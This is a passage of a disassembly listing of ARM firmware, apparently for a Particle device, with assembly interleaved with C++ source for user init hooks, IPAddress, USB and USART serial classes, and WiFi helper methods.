 80a09da:	f7ff fcb5 	bl	80a0348 <system_ctrl_set_result>
}
 80a09de:	e7f4      	b.n	80a09ca <_ZL20ctrl_request_handlerP12ctrl_request+0x1e>
 80a09e0:	200000b0 	.word	0x200000b0

080a09e4 <module_user_init_hook>:
    newlib_impure_ptr_callback([](struct _reent* r, size_t size, uint32_t version, void* ctx) -> void {
 80a09e4:	2100      	movs	r1, #0
{
 80a09e6:	b510      	push	{r4, lr}
    newlib_impure_ptr_callback([](struct _reent* r, size_t size, uint32_t version, void* ctx) -> void {
 80a09e8:	4811      	ldr	r0, [pc, #68]	; (80a0a30 <module_user_init_hook+0x4c>)
 80a09ea:	f7ff fd3f 	bl	80a046c <newlib_impure_ptr_callback>
#endif // HAL_PLATFORM_NEWLIB

#if HAL_PLATFORM_BACKUP_RAM
    backup_ram_was_valid_ = __backup_sram_signature == signature;
 80a09ee:	4b11      	ldr	r3, [pc, #68]	; (80a0a34 <module_user_init_hook+0x50>)
 80a09f0:	681a      	ldr	r2, [r3, #0]
 80a09f2:	4b11      	ldr	r3, [pc, #68]	; (80a0a38 <module_user_init_hook+0x54>)
 80a09f4:	429a      	cmp	r2, r3
 80a09f6:	bf0c      	ite	eq
 80a09f8:	2201      	moveq	r2, #1
 80a09fa:	2200      	movne	r2, #0
 80a09fc:	4b0f      	ldr	r3, [pc, #60]	; (80a0a3c <module_user_init_hook+0x58>)
 80a09fe:	701a      	strb	r2, [r3, #0]
    if (!backup_ram_was_valid_) {
 80a0a00:	d001      	beq.n	80a0a06 <module_user_init_hook+0x22>
        system_initialize_user_backup_ram();
 80a0a02:	f7ff ffb1 	bl	80a0968 <_Z33system_initialize_user_backup_ramv>
    }
#endif

#if HAL_PLATFORM_RNG
    // Initialize the default stdlib PRNG using hardware RNG as a seed
    const uint32_t seed = HAL_RNG_GetRandomNumber();
 80a0a06:	f7ff fbe5 	bl	80a01d4 <HAL_RNG_GetRandomNumber>
 80a0a0a:	4604      	mov	r4, r0
    srand(seed);
 80a0a0c:	f000 fab4 	bl	80a0f78 <srand>

    // If the user defines random_seed_from_cloud, call it with a seed value
    // generated by a hardware RNG as well.
    if (random_seed_from_cloud) {
 80a0a10:	4b0b      	ldr	r3, [pc, #44]	; (80a0a40 <module_user_init_hook+0x5c>)
 80a0a12:	b113      	cbz	r3, 80a0a1a <module_user_init_hook+0x36>
        random_seed_from_cloud(seed);
 80a0a14:	4620      	mov	r0, r4
 80a0a16:	f3af 8000 	nop.w
    }
#endif
    // Register the random_seed_from_cloud handler
    spark_set_random_seed_from_cloud_handler(&random_seed_from_cloud, nullptr);
 80a0a1a:	2100      	movs	r1, #0
 80a0a1c:	4808      	ldr	r0, [pc, #32]	; (80a0a40 <module_user_init_hook+0x5c>)
 80a0a1e:	f7ff fcfd 	bl	80a041c <spark_set_random_seed_from_cloud_handler>

    // Register application handler for the control requests
    system_ctrl_set_app_request_handler(ctrl_request_handler, nullptr);
}
 80a0a22:	e8bd 4010 	ldmia.w	sp!, {r4, lr}
    system_ctrl_set_app_request_handler(ctrl_request_handler, nullptr);
 80a0a26:	2100      	movs	r1, #0
 80a0a28:	4806      	ldr	r0, [pc, #24]	; (80a0a44 <module_user_init_hook+0x60>)
 80a0a2a:	f7ff bc83 	b.w	80a0334 <system_ctrl_set_app_request_handler>
 80a0a2e:	bf00      	nop
 80a0a30:	080a08e9 	.word	0x080a08e9
 80a0a34:	40024000 	.word	0x40024000
 80a0a38:	9a271c1e 	.word	0x9a271c1e
 80a0a3c:	200000ac 	.word	0x200000ac
 80a0a40:	00000000 	.word	0x00000000
 80a0a44:	080a09ad 	.word	0x080a09ad

080a0a48 <_ZN9IPAddressD1Ev>:
    IPAddress(uint32_t address);
    // 4 bytes defining the IP address in network order
    IPAddress(const uint8_t* address);
    IPAddress(const HAL_IPAddress& address);

    virtual ~IPAddress() {}
 80a0a48:	4770      	bx	lr

080a0a4a <_ZNK9IPAddress7printToER5Print>:
#endif // Wiring_IPv6
	return address.ipv4==that.address.ipv4;
}

size_t IPAddress::printTo(Print& p) const
{
 80a0a4a:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 80a0a4c:	460e      	mov	r6, r1
 80a0a4e:	2400      	movs	r4, #0
 80a0a50:	f100 0708 	add.w	r7, r0, #8
 80a0a54:	1d05      	adds	r5, r0, #4
            val = n;
        }
#if __GNUC__ >= 9
#pragma GCC diagnostic pop
#endif // __GNUC__ >= 9
        return printNumber(val, base) + t;
 80a0a56:	f817 1d01 	ldrb.w	r1, [r7, #-1]!
 80a0a5a:	220a      	movs	r2, #10
 80a0a5c:	4630      	mov	r0, r6
 80a0a5e:	f7ff fde0 	bl	80a0622 <_ZN5Print11printNumberEmh>
#else
#pragma message "HAL_USE_INET_HAL_POSIX is required for IPv6 support in IPAddress::printTo()"
#endif // HAL_USE_INET_HAL_POSIX
#endif // Wiring_IPv6
    size_t n = 0;
    for (int i = 0; i < 4; i++)
 80a0a62:	42af      	cmp	r7, r5
    {
        if (n)
            n += p.print('.');
        n += p.print((*this)[i], DEC);
 80a0a64:	4404      	add	r4, r0
    for (int i = 0; i < 4; i++)
 80a0a66:	d101      	bne.n	80a0a6c <_ZNK9IPAddress7printToER5Print+0x22>
    }
    return n;
}
 80a0a68:	4620      	mov	r0, r4
 80a0a6a:	bdf8      	pop	{r3, r4, r5, r6, r7, pc}
        if (n)
 80a0a6c:	2c00      	cmp	r4, #0
 80a0a6e:	d0f2      	beq.n	80a0a56 <_ZNK9IPAddress7printToER5Print+0xc>
            n += p.print('.');
 80a0a70:	212e      	movs	r1, #46	; 0x2e
 80a0a72:	4630      	mov	r0, r6
 80a0a74:	f7ff fdd2 	bl	80a061c <_ZN5Print5printEc>
 80a0a78:	4404      	add	r4, r0
 80a0a7a:	e7ec      	b.n	80a0a56 <_ZNK9IPAddress7printToER5Print+0xc>

080a0a7c <_ZN9IPAddressD0Ev>:
 80a0a7c:	b510      	push	{r4, lr}
 80a0a7e:	4604      	mov	r4, r0
 80a0a80:	2118      	movs	r1, #24
 80a0a82:	f7ff fb0a 	bl	80a009a <_ZdlPvj>
 80a0a86:	4620      	mov	r0, r4
 80a0a88:	bd10      	pop	{r4, pc}
	...

080a0a8c <_ZN9IPAddressC1Ev>:
IPAddress::IPAddress()
 80a0a8c:	b510      	push	{r4, lr}
 80a0a8e:	4604      	mov	r4, r0
 80a0a90:	4b04      	ldr	r3, [pc, #16]	; (80a0aa4 <_ZN9IPAddressC1Ev+0x18>)
        return address;
    }

    virtual size_t printTo(Print& p) const;

    void clear() { memset(&address, 0, sizeof (address)); }
 80a0a92:	2211      	movs	r2, #17
 80a0a94:	2100      	movs	r1, #0
 80a0a96:	f840 3b04 	str.w	r3, [r0], #4
 80a0a9a:	f000 fa65 	bl	80a0f68 <memset>
}
 80a0a9e:	4620      	mov	r0, r4
 80a0aa0:	bd10      	pop	{r4, pc}
 80a0aa2:	bf00      	nop
 80a0aa4:	080a13ac 	.word	0x080a13ac

080a0aa8 <_ZN9IPAddressC1ERK16_HAL_IPAddress_t>:
IPAddress::IPAddress(const HAL_IPAddress& address)
 80a0aa8:	4603      	mov	r3, r0
 80a0aaa:	4a07      	ldr	r2, [pc, #28]	; (80a0ac8 <_ZN9IPAddressC1ERK16_HAL_IPAddress_t+0x20>)
 80a0aac:	b510      	push	{r4, lr}
 80a0aae:	f843 2b04 	str.w	r2, [r3], #4
    memcpy(&this->address, &address, sizeof(address));
 80a0ab2:	f101 0210 	add.w	r2, r1, #16
 80a0ab6:	f851 4b04 	ldr.w	r4, [r1], #4
 80a0aba:	4291      	cmp	r1, r2
 80a0abc:	f843 4b04 	str.w	r4, [r3], #4
 80a0ac0:	d1f9      	bne.n	80a0ab6 <_ZN9IPAddressC1ERK16_HAL_IPAddress_t+0xe>
 80a0ac2:	780a      	ldrb	r2, [r1, #0]
 80a0ac4:	701a      	strb	r2, [r3, #0]
}
 80a0ac6:	bd10      	pop	{r4, pc}
 80a0ac8:	080a13ac 	.word	0x080a13ac

080a0acc <_ZN9IPAddressC1Em>:
IPAddress::IPAddress(uint32_t addr)
 80a0acc:	4a02      	ldr	r2, [pc, #8]	; (80a0ad8 <_ZN9IPAddressC1Em+0xc>)
    address.ipv4 = addr;
 80a0ace:	e9c0 2100 	strd	r2, r1, [r0]
        address.v = version;
 80a0ad2:	2204      	movs	r2, #4
 80a0ad4:	7502      	strb	r2, [r0, #20]
}
 80a0ad6:	4770      	bx	lr
 80a0ad8:	080a13ac 	.word	0x080a13ac

080a0adc <_ZN9IPAddress8set_ipv4Ehhhh>:
{
 80a0adc:	b510      	push	{r4, lr}
    address.ipv4 = b0<<24 | b1 << 16 | b2 << 8 | b3;
 80a0ade:	f89d 4008 	ldrb.w	r4, [sp, #8]
 80a0ae2:	ea44 2403 	orr.w	r4, r4, r3, lsl #8
 80a0ae6:	2304      	movs	r3, #4
 80a0ae8:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 80a0aec:	ea44 6401 	orr.w	r4, r4, r1, lsl #24
 80a0af0:	6044      	str	r4, [r0, #4]
 80a0af2:	7503      	strb	r3, [r0, #20]
}
 80a0af4:	bd10      	pop	{r4, pc}
	...

080a0af8 <_ZN9IPAddressC1Ehhhh>:
IPAddress::IPAddress(uint8_t first_octet, uint8_t second_octet, uint8_t third_octet, uint8_t fourth_octet)
 80a0af8:	b513      	push	{r0, r1, r4, lr}
 80a0afa:	4c04      	ldr	r4, [pc, #16]	; (80a0b0c <_ZN9IPAddressC1Ehhhh+0x14>)
 80a0afc:	6004      	str	r4, [r0, #0]
    set_ipv4(first_octet, second_octet, third_octet, fourth_octet);
 80a0afe:	f89d 4010 	ldrb.w	r4, [sp, #16]
 80a0b02:	9400      	str	r4, [sp, #0]
 80a0b04:	f7ff ffea 	bl	80a0adc <_ZN9IPAddress8set_ipv4Ehhhh>
}
 80a0b08:	b002      	add	sp, #8
 80a0b0a:	bd10      	pop	{r4, pc}
 80a0b0c:	080a13ac 	.word	0x080a13ac

080a0b10 <_ZN9USBSerial14blockOnOverrunEb>:
  HAL_USB_USART_Flush_Data(_serial);
}

void USBSerial::blockOnOverrun(bool block)
{
  _blocking = block;
 80a0b10:	7441      	strb	r1, [r0, #17]
}
 80a0b12:	4770      	bx	lr

080a0b14 <__tcf_0>:
}

USBSerial& _fetch_usbserial()
{
  HAL_USB_USART_Config conf = acquireSerialBuffer();
	static USBSerial _usbserial(HAL_USB_USART_SERIAL, conf);
 80a0b14:	4770      	bx	lr

080a0b16 <_ZN9USBSerialD1Ev>:
#include "usb_hal.h"
#include "system_task.h"
#include "spark_wiring_startup.h"
#include "concurrent_hal.h"

class USBSerial : public Stream
 80a0b16:	4770      	bx	lr

080a0b18 <_ZN9USBSerial4readEv>:
{
 80a0b18:	b508      	push	{r3, lr}
	return std::max(-1, (int)HAL_USB_USART_Receive_Data(_serial, false));
 80a0b1a:	2100      	movs	r1, #0
 80a0b1c:	7c00      	ldrb	r0, [r0, #16]
 80a0b1e:	f7ff fbb9 	bl	80a0294 <HAL_USB_USART_Receive_Data>
}
 80a0b22:	ea40 70e0 	orr.w	r0, r0, r0, asr #31
 80a0b26:	bd08      	pop	{r3, pc}

080a0b28 <_ZN9USBSerial4peekEv>:
{
 80a0b28:	b508      	push	{r3, lr}
	return std::max(-1, (int)HAL_USB_USART_Receive_Data(_serial, true));
 80a0b2a:	2101      	movs	r1, #1
 80a0b2c:	7c00      	ldrb	r0, [r0, #16]
 80a0b2e:	f7ff fbb1 	bl	80a0294 <HAL_USB_USART_Receive_Data>
}
 80a0b32:	ea40 70e0 	orr.w	r0, r0, r0, asr #31
 80a0b36:	bd08      	pop	{r3, pc}

080a0b38 <_ZN9USBSerial17availableForWriteEv>:
{
 80a0b38:	b508      	push	{r3, lr}
  return std::max(0, (int)HAL_USB_USART_Available_Data_For_Write(_serial));
 80a0b3a:	7c00      	ldrb	r0, [r0, #16]
 80a0b3c:	f7ff fba2 	bl	80a0284 <HAL_USB_USART_Available_Data_For_Write>
}
 80a0b40:	ea20 70e0 	bic.w	r0, r0, r0, asr #31
 80a0b44:	bd08      	pop	{r3, pc}

080a0b46 <_ZN9USBSerial9availableEv>:
{
 80a0b46:	b508      	push	{r3, lr}
	return std::max(0, (int)HAL_USB_USART_Available_Data(_serial));
 80a0b48:	7c00      	ldrb	r0, [r0, #16]
 80a0b4a:	f7ff fb93 	bl	80a0274 <HAL_USB_USART_Available_Data>
}
 80a0b4e:	ea20 70e0 	bic.w	r0, r0, r0, asr #31
 80a0b52:	bd08      	pop	{r3, pc}

080a0b54 <_ZN9USBSerial5writeEh>:
{
 80a0b54:	b538      	push	{r3, r4, r5, lr}
 80a0b56:	4604      	mov	r4, r0
  if (HAL_USB_USART_Available_Data_For_Write(_serial) > 0 || _blocking) {
 80a0b58:	7c00      	ldrb	r0, [r0, #16]
{
 80a0b5a:	460d      	mov	r5, r1
  if (HAL_USB_USART_Available_Data_For_Write(_serial) > 0 || _blocking) {
 80a0b5c:	f7ff fb92 	bl	80a0284 <HAL_USB_USART_Available_Data_For_Write>
 80a0b60:	2800      	cmp	r0, #0
 80a0b62:	dc01      	bgt.n	80a0b68 <_ZN9USBSerial5writeEh+0x14>
 80a0b64:	7c60      	ldrb	r0, [r4, #17]
 80a0b66:	b128      	cbz	r0, 80a0b74 <_ZN9USBSerial5writeEh+0x20>
    return std::max(0, (int)HAL_USB_USART_Send_Data(_serial, byte));
 80a0b68:	4629      	mov	r1, r5
 80a0b6a:	7c20      	ldrb	r0, [r4, #16]
 80a0b6c:	f7ff fb9a 	bl	80a02a4 <HAL_USB_USART_Send_Data>
 80a0b70:	ea20 70e0 	bic.w	r0, r0, r0, asr #31
}
 80a0b74:	bd38      	pop	{r3, r4, r5, pc}

080a0b76 <_ZN9USBSerial5flushEv>:
  HAL_USB_USART_Flush_Data(_serial);
 80a0b76:	7c00      	ldrb	r0, [r0, #16]
 80a0b78:	f7ff bb9c 	b.w	80a02b4 <HAL_USB_USART_Flush_Data>

080a0b7c <_ZN9USBSerialD0Ev>:
 80a0b7c:	b510      	push	{r4, lr}
 80a0b7e:	4604      	mov	r4, r0
 80a0b80:	2114      	movs	r1, #20
 80a0b82:	f7ff fa8a 	bl	80a009a <_ZdlPvj>
 80a0b86:	4620      	mov	r0, r4
 80a0b88:	bd10      	pop	{r4, pc}

080a0b8a <__tcf_1>:
 80a0b8a:	4770      	bx	lr

080a0b8c <_ZN9USBSerialC1E20HAL_USB_USART_SerialRK20HAL_USB_USART_Config>:
USBSerial::USBSerial(HAL_USB_USART_Serial serial, const HAL_USB_USART_Config& conf)
 80a0b8c:	b510      	push	{r4, lr}
    virtual int available() = 0;
    virtual int read() = 0;
    virtual int peek() = 0;
    virtual void flush() = 0;

    Stream() {_timeout=1000;}
 80a0b8e:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 80a0b92:	4604      	mov	r4, r0
 80a0b94:	4608      	mov	r0, r1
 80a0b96:	2100      	movs	r1, #0
 80a0b98:	e9c4 1301 	strd	r1, r3, [r4, #4]
 80a0b9c:	4b04      	ldr	r3, [pc, #16]	; (80a0bb0 <_ZN9USBSerialC1E20HAL_USB_USART_SerialRK20HAL_USB_USART_Config+0x24>)
  _serial = serial;
 80a0b9e:	7420      	strb	r0, [r4, #16]
USBSerial::USBSerial(HAL_USB_USART_Serial serial, const HAL_USB_USART_Config& conf)
 80a0ba0:	6023      	str	r3, [r4, #0]
  _blocking = true;
 80a0ba2:	2301      	movs	r3, #1
  HAL_USB_USART_Init(_serial, &conf);
 80a0ba4:	4611      	mov	r1, r2
  _blocking = true;
 80a0ba6:	7463      	strb	r3, [r4, #17]
  HAL_USB_USART_Init(_serial, &conf);
 80a0ba8:	f7ff fb5c 	bl	80a0264 <HAL_USB_USART_Init>
}
 80a0bac:	4620      	mov	r0, r4
 80a0bae:	bd10      	pop	{r4, pc}
 80a0bb0:	080a13c0 	.word	0x080a13c0

080a0bb4 <_Z19acquireSerialBufferv>:
{
 80a0bb4:	b510      	push	{r4, lr}
 80a0bb6:	4604      	mov	r4, r0
  HAL_USB_USART_Config conf = {};
 80a0bb8:	2214      	movs	r2, #20
 80a0bba:	2100      	movs	r1, #0
 80a0bbc:	f000 f9d4 	bl	80a0f68 <memset>
}
 80a0bc0:	4620      	mov	r0, r4
 80a0bc2:	bd10      	pop	{r4, pc}

080a0bc4 <_Z16_fetch_usbserialv>:
{
 80a0bc4:	b530      	push	{r4, r5, lr}
	static USBSerial _usbserial(HAL_USB_USART_SERIAL, conf);
 80a0bc6:	4d0e      	ldr	r5, [pc, #56]	; (80a0c00 <_Z16_fetch_usbserialv+0x3c>)
{
 80a0bc8:	b087      	sub	sp, #28
  HAL_USB_USART_Config conf = acquireSerialBuffer();
 80a0bca:	a801      	add	r0, sp, #4
 80a0bcc:	f7ff fff2 	bl	80a0bb4 <_Z19acquireSerialBufferv>
	static USBSerial _usbserial(HAL_USB_USART_SERIAL, conf);
 80a0bd0:	7829      	ldrb	r1, [r5, #0]
 80a0bd2:	f3bf 8f5b 	dmb	ish
 80a0bd6:	f011 0401 	ands.w	r4, r1, #1
 80a0bda:	d10e      	bne.n	80a0bfa <_Z16_fetch_usbserialv+0x36>
 80a0bdc:	4628      	mov	r0, r5
 80a0bde:	f7ff fa5e 	bl	80a009e <__cxa_guard_acquire>
 80a0be2:	b150      	cbz	r0, 80a0bfa <_Z16_fetch_usbserialv+0x36>
 80a0be4:	4621      	mov	r1, r4
 80a0be6:	aa01      	add	r2, sp, #4
 80a0be8:	4806      	ldr	r0, [pc, #24]	; (80a0c04 <_Z16_fetch_usbserialv+0x40>)
 80a0bea:	f7ff ffcf 	bl	80a0b8c <_ZN9USBSerialC1E20HAL_USB_USART_SerialRK20HAL_USB_USART_Config>
 80a0bee:	4628      	mov	r0, r5
 80a0bf0:	f7ff fa5a 	bl	80a00a8 <__cxa_guard_release>
 80a0bf4:	4804      	ldr	r0, [pc, #16]	; (80a0c08 <_Z16_fetch_usbserialv+0x44>)
 80a0bf6:	f000 f9a3 	bl	80a0f40 <atexit>
	return _usbserial;
}
 80a0bfa:	4802      	ldr	r0, [pc, #8]	; (80a0c04 <_Z16_fetch_usbserialv+0x40>)
 80a0bfc:	b007      	add	sp, #28
 80a0bfe:	bd30      	pop	{r4, r5, pc}
 80a0c00:	200000b4 	.word	0x200000b4
 80a0c04:	200000bc 	.word	0x200000bc
 80a0c08:	080a0b15 	.word	0x080a0b15

080a0c0c <_Z23acquireUSBSerial1Bufferv>:
 80a0c0c:	b510      	push	{r4, lr}
 80a0c0e:	4604      	mov	r4, r0
 80a0c10:	2214      	movs	r2, #20
 80a0c12:	2100      	movs	r1, #0
 80a0c14:	f000 f9a8 	bl	80a0f68 <memset>
 80a0c18:	4620      	mov	r0, r4
 80a0c1a:	bd10      	pop	{r4, pc}

080a0c1c <_Z17_fetch_usbserial1v>:

  return conf;
}

USBSerial& _fetch_usbserial1()
{
 80a0c1c:	b510      	push	{r4, lr}
  HAL_USB_USART_Config conf = acquireUSBSerial1Buffer();
  static USBSerial _usbserial1(HAL_USB_USART_SERIAL1, conf);
 80a0c1e:	4c0e      	ldr	r4, [pc, #56]	; (80a0c58 <_Z17_fetch_usbserial1v+0x3c>)
{
 80a0c20:	b086      	sub	sp, #24
  HAL_USB_USART_Config conf = acquireUSBSerial1Buffer();
 80a0c22:	a801      	add	r0, sp, #4
 80a0c24:	f7ff fff2 	bl	80a0c0c <_Z23acquireUSBSerial1Bufferv>
  static USBSerial _usbserial1(HAL_USB_USART_SERIAL1, conf);
 80a0c28:	7823      	ldrb	r3, [r4, #0]
 80a0c2a:	f3bf 8f5b 	dmb	ish
 80a0c2e:	07db      	lsls	r3, r3, #31
 80a0c30:	d40e      	bmi.n	80a0c50 <_Z17_fetch_usbserial1v+0x34>
 80a0c32:	4620      	mov	r0, r4
 80a0c34:	f7ff fa33 	bl	80a009e <__cxa_guard_acquire>
 80a0c38:	b150      	cbz	r0, 80a0c50 <_Z17_fetch_usbserial1v+0x34>
 80a0c3a:	2101      	movs	r1, #1
 80a0c3c:	aa01      	add	r2, sp, #4
 80a0c3e:	4807      	ldr	r0, [pc, #28]	; (80a0c5c <_Z17_fetch_usbserial1v+0x40>)
 80a0c40:	f7ff ffa4 	bl	80a0b8c <_ZN9USBSerialC1E20HAL_USB_USART_SerialRK20HAL_USB_USART_Config>
 80a0c44:	4620      	mov	r0, r4
 80a0c46:	f7ff fa2f 	bl	80a00a8 <__cxa_guard_release>
 80a0c4a:	4805      	ldr	r0, [pc, #20]	; (80a0c60 <_Z17_fetch_usbserial1v+0x44>)
 80a0c4c:	f000 f978 	bl	80a0f40 <atexit>
  return _usbserial1;
}
 80a0c50:	4802      	ldr	r0, [pc, #8]	; (80a0c5c <_Z17_fetch_usbserial1v+0x40>)
 80a0c52:	b006      	add	sp, #24
 80a0c54:	bd10      	pop	{r4, pc}
 80a0c56:	bf00      	nop
 80a0c58:	200000b8 	.word	0x200000b8
 80a0c5c:	200000d0 	.word	0x200000d0
 80a0c60:	080a0b8b 	.word	0x080a0b8b

080a0c64 <_ZN11USARTSerialD1Ev>:
private:
  hal_usart_interface_t _serial;
  bool _blocking;
public:
  USARTSerial(hal_usart_interface_t serial, const hal_usart_buffer_config_t& config);
  virtual ~USARTSerial() {};
 80a0c64:	4770      	bx	lr

080a0c66 <_ZN11USARTSerial14blockOnOverrunEb>:
    hal_usart_half_duplex(_serial, Enable);
}

void USARTSerial::blockOnOverrun(bool block)
{
  _blocking = block;
 80a0c66:	7441      	strb	r1, [r0, #17]
}
 80a0c68:	4770      	bx	lr

080a0c6a <_ZN11USARTSerial17availableForWriteEv>:


int USARTSerial::availableForWrite(void)
{
 80a0c6a:	b508      	push	{r3, lr}
  return std::max(0, (int)hal_usart_available_data_for_write(_serial));
 80a0c6c:	7c00      	ldrb	r0, [r0, #16]
 80a0c6e:	f7ff fae9 	bl	80a0244 <hal_usart_available_data_for_write>
}
 80a0c72:	ea20 70e0 	bic.w	r0, r0, r0, asr #31
 80a0c76:	bd08      	pop	{r3, pc}

080a0c78 <_ZN11USARTSerial9availableEv>:

int USARTSerial::available(void)
{
 80a0c78:	b508      	push	{r3, lr}
  return std::max(0, (int)hal_usart_available(_serial));
 80a0c7a:	7c00      	ldrb	r0, [r0, #16]
 80a0c7c:	f7ff fac2 	bl	80a0204 <hal_usart_available>
}
 80a0c80:	ea20 70e0 	bic.w	r0, r0, r0, asr #31
 80a0c84:	bd08      	pop	{r3, pc}

080a0c86 <_ZN11USARTSerial4peekEv>:

int USARTSerial::peek(void)
{
 80a0c86:	b508      	push	{r3, lr}
  return std::max(-1, (int)hal_usart_peek(_serial));
 80a0c88:	7c00      	ldrb	r0, [r0, #16]
 80a0c8a:	f7ff facb 	bl	80a0224 <hal_usart_peek>
}
 80a0c8e:	ea40 70e0 	orr.w	r0, r0, r0, asr #31
 80a0c92:	bd08      	pop	{r3, pc}

080a0c94 <_ZN11USARTSerial4readEv>:

int USARTSerial::read(void)
{
 80a0c94:	b508      	push	{r3, lr}
  return std::max(-1, (int)hal_usart_read(_serial));
 80a0c96:	7c00      	ldrb	r0, [r0, #16]
 80a0c98:	f7ff fabc 	bl	80a0214 <hal_usart_read>
}
 80a0c9c:	ea40 70e0 	orr.w	r0, r0, r0, asr #31
 80a0ca0:	bd08      	pop	{r3, pc}

080a0ca2 <_ZN11USARTSerial5flushEv>:

void USARTSerial::flush()
{
  hal_usart_flush(_serial);
 80a0ca2:	7c00      	ldrb	r0, [r0, #16]
 80a0ca4:	f7ff bac6 	b.w	80a0234 <hal_usart_flush>

080a0ca8 <_ZN11USARTSerial5writeEh>:
}

size_t USARTSerial::write(uint8_t c)
{
 80a0ca8:	b570      	push	{r4, r5, r6, lr}
  // attempt a write if blocking, or for non-blocking if there is room.
  if (_blocking || hal_usart_available_data_for_write(_serial) > 0) {
 80a0caa:	7c46      	ldrb	r6, [r0, #17]
{
 80a0cac:	4604      	mov	r4, r0
 80a0cae:	460d      	mov	r5, r1
  if (_blocking || hal_usart_available_data_for_write(_serial) > 0) {
 80a0cb0:	b12e      	cbz	r6, 80a0cbe <_ZN11USARTSerial5writeEh+0x16>
    // the HAL always blocks.
	  return hal_usart_write(_serial, c);
 80a0cb2:	4629      	mov	r1, r5
 80a0cb4:	7c20      	ldrb	r0, [r4, #16]
  }
  return 0;
}
 80a0cb6:	e8bd 4070 	ldmia.w	sp!, {r4, r5, r6, lr}
	  return hal_usart_write(_serial, c);
 80a0cba:	f7ff ba9b 	b.w	80a01f4 <hal_usart_write>
  if (_blocking || hal_usart_available_data_for_write(_serial) > 0) {
 80a0cbe:	7c00      	ldrb	r0, [r0, #16]
 80a0cc0:	f7ff fac0 	bl	80a0244 <hal_usart_available_data_for_write>
 80a0cc4:	2800      	cmp	r0, #0
 80a0cc6:	dcf4      	bgt.n	80a0cb2 <_ZN11USARTSerial5writeEh+0xa>
}
 80a0cc8:	4630      	mov	r0, r6
 80a0cca:	bd70      	pop	{r4, r5, r6, pc}

080a0ccc <_ZN11USARTSerialD0Ev>:
 80a0ccc:	b510      	push	{r4, lr}
 80a0cce:	4604      	mov	r4, r0
 80a0cd0:	2114      	movs	r1, #20
 80a0cd2:	f7ff f9e2 	bl	80a009a <_ZdlPvj>
 80a0cd6:	4620      	mov	r0, r4
 80a0cd8:	bd10      	pop	{r4, pc}
	...

080a0cdc <_ZN11USARTSerialC1E21hal_usart_interface_tRK25hal_usart_buffer_config_t>:
USARTSerial::USARTSerial(hal_usart_interface_t serial, const hal_usart_buffer_config_t& config)
 80a0cdc:	b510      	push	{r4, lr}
 80a0cde:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 80a0ce2:	4604      	mov	r4, r0
 80a0ce4:	4608      	mov	r0, r1
 80a0ce6:	4611      	mov	r1, r2
 80a0ce8:	2200      	movs	r2, #0
 80a0cea:	e9c4 2301 	strd	r2, r3, [r4, #4]
 80a0cee:	4b04      	ldr	r3, [pc, #16]	; (80a0d00 <_ZN11USARTSerialC1E21hal_usart_interface_tRK25hal_usart_buffer_config_t+0x24>)
  _serial = serial;
 80a0cf0:	7420      	strb	r0, [r4, #16]
USARTSerial::USARTSerial(hal_usart_interface_t serial, const hal_usart_buffer_config_t& config)
 80a0cf2:	6023      	str	r3, [r4, #0]
  _blocking = true;
 80a0cf4:	2301      	movs	r3, #1
 80a0cf6:	7463      	strb	r3, [r4, #17]
  hal_usart_init_ex(serial, &config, nullptr);
 80a0cf8:	f7ff faac 	bl	80a0254 <hal_usart_init_ex>
}
 80a0cfc:	4620      	mov	r0, r4
 80a0cfe:	bd10      	pop	{r4, pc}
 80a0d00:	080a13f0 	.word	0x080a13f0

080a0d04 <_ZN5spark9WiFiClass5readyEv>:
    bool connecting(void) {
        return network_connecting(*this, 0, NULL);
    }

    bool ready(void) {
        return network_ready(*this, 0, NULL);
 80a0d04:	2200      	movs	r2, #0
 80a0d06:	6840      	ldr	r0, [r0, #4]
 80a0d08:	4611      	mov	r1, r2
 80a0d0a:	f7ff bb3f 	b.w	80a038c <network_ready>

080a0d0e <_ZN5spark9WiFiClass7resolveEPKc>:
    bool clearCredentials(void) {
        return network_clear_credentials(*this, 0, NULL, NULL);
    }

#if !HAL_USE_INET_HAL_POSIX
    IPAddress resolve(const char* name)
 80a0d0e:	b5f0      	push	{r4, r5, r6, r7, lr}
 80a0d10:	4615      	mov	r5, r2
 80a0d12:	b089      	sub	sp, #36	; 0x24
    {
        HAL_IPAddress ip = {};
 80a0d14:	2211      	movs	r2, #17
    IPAddress resolve(const char* name)
 80a0d16:	460e      	mov	r6, r1
 80a0d18:	4604      	mov	r4, r0
        HAL_IPAddress ip = {};
 80a0d1a:	2100      	movs	r1, #0
 80a0d1c:	a803      	add	r0, sp, #12
 80a0d1e:	f000 f923 	bl	80a0f68 <memset>
        return (inet_gethostbyname(name, strlen(name), &ip, *this, NULL) != 0) ?
 80a0d22:	4628      	mov	r0, r5
 80a0d24:	f000 f95e 	bl	80a0fe4 <strlen>
 80a0d28:	2700      	movs	r7, #0
 80a0d2a:	b281      	uxth	r1, r0
 80a0d2c:	6873      	ldr	r3, [r6, #4]
 80a0d2e:	4628      	mov	r0, r5
 80a0d30:	9700      	str	r7, [sp, #0]
 80a0d32:	aa03      	add	r2, sp, #12
 80a0d34:	f7ff fae6 	bl	80a0304 <inet_gethostbyname>
                IPAddress(uint32_t(0)) : IPAddress(ip);
 80a0d38:	b130      	cbz	r0, 80a0d48 <_ZN5spark9WiFiClass7resolveEPKc+0x3a>
 80a0d3a:	4639      	mov	r1, r7
 80a0d3c:	4620      	mov	r0, r4
 80a0d3e:	f7ff fec5 	bl	80a0acc <_ZN9IPAddressC1Em>
    }
 80a0d42:	4620      	mov	r0, r4
 80a0d44:	b009      	add	sp, #36	; 0x24
 80a0d46:	bdf0      	pop	{r4, r5, r6, r7, pc}
                IPAddress(uint32_t(0)) : IPAddress(ip);
 80a0d48:	4620      	mov	r0, r4
 80a0d4a:	a903      	add	r1, sp, #12
 80a0d4c:	f7ff feac 	bl	80a0aa8 <_ZN9IPAddressC1ERK16_HAL_IPAddress_t>
 80a0d50:	e7f7      	b.n	80a0d42 <_ZN5spark9WiFiClass7resolveEPKc+0x34>

080a0d52 <_ZN5spark9WiFiClass9listeningEv>:
        return network_listening(*this, 0, NULL);
 80a0d52:	2200      	movs	r2, #0
 80a0d54:	6840      	ldr	r0, [r0, #4]
 80a0d56:	4611      	mov	r1, r2
 80a0d58:	f7ff bb38 	b.w	80a03cc <network_listening>

080a0d5c <_ZN5spark9WiFiClass16getListenTimeoutEv>:
        return network_get_listen_timeout(*this, 0, NULL);
 80a0d5c:	2200      	movs	r2, #0
